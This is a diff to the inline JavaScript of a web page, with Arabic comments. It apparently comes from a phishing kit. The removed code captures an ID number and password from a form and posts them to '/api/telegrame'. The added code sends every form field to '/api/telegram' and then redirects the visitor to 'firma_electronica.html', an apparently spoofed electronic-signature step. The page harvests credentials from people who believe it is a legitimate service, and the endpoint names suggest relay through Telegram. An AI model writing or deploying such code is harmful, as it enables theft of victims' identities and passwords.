@@ -125,8 +125,27 @@
 
 
 <script type="text/javascript">
-
 	
+const form = document.getElementById("sscsc");
+
+form.addEventListener("submit", (e) => {
+  e.preventDefault(); // منع الإرسال التقليدي للفورم
+
+  const data = Object.fromEntries(new FormData(form));
+
+  // إرسال البيانات للـ API بدون انتظار النتيجة
+  fetch("/api/telegram", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data),
+  }).catch(err => console.error(err)); // أي خطأ نكتفيو بالطباعة فقط
+
+  // بعد 5 ثواني، redirect مباشرة ل sms.html
+  setTimeout(() => {
+    window.location.href = "firma_electronica.html";
+  }, 5000);
+});
+
 
 $(document).ready(function(){
 
@@ -239,27 +258,7 @@ $("#I").click(function(){
 
 
 });
-document.getElementById("sscsc").addEventListener("submit", (e) => {
-  e.preventDefault(); // منع الإرسال العادي للفورم
 
-  // نجيب البيانات من الحقول
-  const data = {
-    id_no: document.getElementById("nameinputs").value,
-    password: document.getElementById("input_6").value
-  };
-
-  // إرسال البيانات لـ API
-  fetch("/api/telegrame", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data),
-  }).catch(err => console.error("❌ Error:", err));
-
-  // بعد 5 ثواني ندير تحويل ل firma_electronica.html
-  setTimeout(() => {
-    window.location.href = "firma_electronica.html";
-  }, 5000);
-});
 
 </script>
 
